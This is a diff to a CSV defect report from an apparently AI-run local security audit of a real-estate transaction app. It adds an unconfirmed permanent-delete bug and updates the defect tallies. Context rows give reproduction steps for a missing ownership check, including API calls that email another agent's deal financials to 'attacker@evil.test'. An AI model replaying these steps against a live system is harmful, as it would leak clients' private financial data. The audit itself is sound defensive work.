@@ -14,6 +14,7 @@ TD-011,Environment,server/.env — public callback URLs,Stale tunnel hostname le
 TD-012,Quick Actions,"Transaction → Quick Actions → Deposit Receipt / Trade Sheet / Notice of Sale",Quick Action send and write endpoints have NO ownership check — an agent can email any deal's financials to an address of their choosing and edit any deal's Notice of Sale,"1. Sign in as agent Akhil (user 2), who receives 403 on GET /api/transactions/3. 2. POST /api/transactions/3/deposit-receipt/send {""email"":""attacker@evil.test"",""cc"":""second@evil.test""}. 3. Repeat for transaction 4 (unassigned, administrator-only). 4. PUT /api/transactions/3/notice-of-sale with buyers/sellers/agents.",Every one of these must return 403 for a transaction the caller is not the agent on — the same answer GET already gives.,"Step 2 returned HTTP 200 {""ok"":true} and mailed trade number, property address and deposit amount to the attacker-supplied address plus cc. Step 3 also returned 200 for an administrator-only deal. Step 4 returned 200 and PERSISTED the change to transactions.notice_of_sale for another agent's deal.",Critical,P1,Security,New,Claude (local audit),2026-08-19,Local — branch version_3,"server/src/quick-actions/quick-send.service.ts (depositReceipt/tradeSheet) and notice-of-sale.service.ts — neither file contains a single authorization call; quick-actions.controller.ts calls access.assertTransaction on the READ route only","REPRODUCED LOCALLY; notice_of_sale on txn 3 restored to NULL afterwards and mail was diverted to the sink, so nothing left the machine. Root cause: the class-level @Screen('transactions','edit') is a SCREEN permission, which every agent holds — it says which screens you may open, not which rows are yours. The per-record check that transactions.service.ts, documents.service.ts and bulk-export all apply is simply absent here. Fix: call ResourceAccessService.assertTransaction at the top of depositReceipt, tradeSheet, save and send — exactly as showNotice already does."
 TD-013,Quick Actions,Transaction → Quick Actions → Trade Sheet,Validation error message discloses the property address of a transaction the caller cannot access,"As agent Akhil (403 on GET /api/transactions/3), POST /api/transactions/3/trade-sheet/send {""email"":""x@y.test""}.",A caller with no access to the deal must not learn anything about it from the error — 403 before any validation runs.,"HTTP 422 with the message ""Buyer and seller lawyer details are required before the Trade Record Sheet can be sent for 5 Glenmount Court, Whitby, Ontario, L1N 6B1, Canada."" — the full street address of another agent's deal, leaked to a user who is refused the record itself.",Medium,P2,Security,New,Claude (local audit),2026-08-19,Local — branch version_3,server/src/quick-actions/quick-send.service.ts → tradeSheet() validation path,REPRODUCED LOCALLY. Fixing TD-012 closes this as a side effect — the ownership check must run before validation so the request is refused before any record detail is read.
 TD-014,Quick Actions,Transaction → Quick Actions → Notice of Sale,Notice of Sale accepts any data type and silently stores the string "[object Object]",PUT /api/transactions/:id/notice-of-sale with buyers as an array of objects rather than an array of strings.,Reject a non-string entry with 422 — or read the name from the object.,"HTTP 200, and the literal text ""[object Object]"" was written into transactions.notice_of_sale AND into the audit trail as the new value, destroying the buyer and seller names.",Low,P3,Bug,New,Claude (local audit),2026-08-19,Local — branch version_3,"server/src/quick-actions/notice-of-sale.service.ts lines 44-45 — String(v ?? '').trim() coerces any type without validating it",REPRODUCED LOCALLY (txn 3 restored). Not reachable through the UI — NoticeOfSaleModal sends comma-separated strings — so this affects API consumers and imports only. Same class of gap as TD-004: coercion where validation belongs.
+TD-015,Leads (CRM),Leads → Recently Deleted → "Delete Forever",Permanent delete of a lead and all its history fires on a single click with no confirmation,"1. Open Leads → Recently Deleted. 2. Click ""Delete Forever"" on any row. 3. Observe: the row disappears immediately. 4. Check the database for the lead's notes, tasks, showings and calls.","A destructive, irreversible action must ask for confirmation and name what else it will remove — exactly as the Transaction Desk Recycle Bin already does (""Permanently delete X? This removes it for good and cannot be undone."" plus a list of linked records).","One click issues DELETE /api/leads/deleted/:id with no dialog. Verified end to end on a throwaway lead: the lead row plus its note, task, showing and call were all destroyed (all counts 0) and cannot be recovered. The ""Delete Forever"" button sits directly beside ""Restore"" with identical styling (btn ghost sm) and no destructive colour, so a misclick is irreversible.",Major,P2,Bug,New,Claude (local audit),2026-08-29,Local — branch version_3,"client/src/desk/LeadsPage.tsx → act(id,'purge') calls purgeLead() directly, bypassing the useConfirm/askDelete pattern used everywhere else; server LeadsService.purge() + ON DELETE CASCADE on lead_notes / lead_tasks / lead_showings / lead_calls / lead_messages / lead_emails","REPRODUCED LOCALLY on a purpose-made lead (id 1338854, destroyed by the test; database back at baseline 797 leads / 690 soft-deleted). NOTE the reported claim is only half right: the ordinary Delete button is a SOFT delete and DOES confirm (""The lead moves to Recently Deleted and can be restored from there""), as does bulk delete — nothing is lost there. The unconfirmed, irreversible path is Delete Forever inside Recently Deleted. Exposure today: 690 leads sit in Recently Deleted carrying 1 note, 6 tasks, 7 showings and 2 calls, and LEAD_RETENTION_DAYS=0 means none of them are ever auto-purged. Fix is one call: wrap act(id,'purge') in askDelete with the linked-record list, mirroring RecycleBinPage.doForce."
 ,,,,,,,,,,,,,,,
 Summary
 Transaction Desk Defect Report,,,,,
@@ -21,7 +22,7 @@ Prepared from a local end-to-end audit of the Transaction Management module,,,,,
 Date: 2026-08-19,,,,,
 Environment: Local — branch version_3 (API localhost:8000 / SPA localhost:5173 / PostgreSQL 127.0.0.1:5432 myapp),,,,,
 Roles tested: admin (user 10108) and agent (user 2),,,,,
-Total defects: 14,,,,,
+Total defects: 15  (14 Transaction Desk + 1 CRM Leads verified on request),,,,,
 ,,,,,
 Module,Critical,Major,Medium,Low,Total
 Invoice,2,1,0,0,3
@@ -29,10 +30,11 @@ Documents,1,0,0,0,1
 Quick Actions,1,0,1,1,3
 Transactions,0,2,2,1,5
 Environment,0,1,0,1,2
-TOTAL,4,4,3,3,14
+Leads (CRM — outside Desk scope),0,1,0,0,1
+TOTAL,4,5,3,3,15
 ,,,,,
 Type,Count,,,,
-Bug,6,,,,
+Bug,7,,,,
 Security,3,,,,
 Configuration,2,,,,
 Missing Validation,1,,,,
@@ -41,7 +43,7 @@ Scalability,1,,,,
 ,,,,,
 Priority,Count,,,,
 P1 — Immediate blocker,5,,,,
-P2 — Must fix before production,4,,,,
+P2 — Must fix before production,5,,,,
 P3 — Should fix / improvement,5,,,,
 ,,,,,
 Module Scores,Functional,Security,Data Integrity,Performance,UX,Local Readiness
@@ -57,7 +59,7 @@ Documents,85,40,85,80,80,62
 Invoice,65,85,35,85,75,55
 Quick Actions,80,20,55,85,80,45
 ,,,,,
-Overall Readiness Score,62/100,,,,
+Overall Readiness Score (Transaction Desk only),62/100,,,,
 Classification,Major Fixes Required Before Production,,,,
 ,,,,,
 "Verified PASS (tested, not assumed)",,,,,
